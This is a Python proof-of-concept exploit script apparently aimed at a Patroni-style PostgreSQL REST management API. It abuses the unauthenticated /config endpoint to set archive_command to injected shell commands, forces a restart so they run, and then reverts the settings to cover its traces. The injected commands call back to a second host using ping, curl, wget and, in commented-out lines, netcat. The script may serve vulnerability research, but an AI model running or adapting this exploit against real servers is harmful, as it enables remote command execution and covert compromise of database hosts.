import requests
import json

url = "http://192.168.0.178:8008"
host = "192.168.0.193"
cmd = f"ping {host} -c 2;"
cmd += f"curl http://{host}:8008/c;"
cmd += f"/usr/bin/curl http://{host}:8008/cp;"
cmd += f"wget http://{host}:8008/w;"
cmd += f"/usr/bin/wget http://{host}:8008/wp;"

""""
cmd += f"echo N|nc {host} 8008;"
cmd += f"echo NP|/usr/bin/nc {host} 8008"
"""


headers = {"User-Agent": "Java/1.6.0_39"}


def get_config(url, headers):
    url_config = f"{url}/config"
    print(f"[+] Getting the configuration:\n{url_config}\n")
    r = requests.get(url_config, headers=headers)
    print(f"Status Code: {r.status_code}\nResponse: {r.text}\n")


def change_config(url, headers, cmd):
    url_config = f"{url}/config"
    payload = {"postgresql": {"parameters": {"wal_level": "replica",
                                             "archive_mode": "always",
                                             "archive_command": "__cmd__",
                                             "archive_timeout": "1"}}}
    payload['postgresql']['parameters']['archive_command'] = cmd
    print(f"[+] Changing the configuration:\n{url_config}\n{payload}\n")
    r = requests.patch(url_config, data=json.dumps(payload), headers=headers)
    print(f"Status Code: {r.status_code}\nResponse: {r.text}\n")


def restart(url, headers, timeout):
    url_restart = f"{url}/restart"
    print(f"[+] Restarting:\n{url_restart}\n")
    r = requests.post(url_restart, headers=headers, timeout=timeout)
    print(f"Status Code: {r.status_code}\nResponse: {r.text}\n")


def revert_config(url, headers):
    url_config = f"{url}/config"
    payload = {"postgresql": {"parameters": {"wal_level": None,
                                             "archive_mode": None,
                                             "archive_command": None,
                                             "archive_timeout": None}}}
    print(f"[+] Changing the configuration:\n{url_config}\n{payload}\n")
    r = requests.patch(url_config, data=json.dumps(payload), headers=headers)
    print(f"Status Code: {r.status_code}\nResponse: {r.text}\n")


get_config(url, headers)

change_config(url, headers, cmd)

restart(url, headers, 10)

revert_config(url, headers)


"""

"""
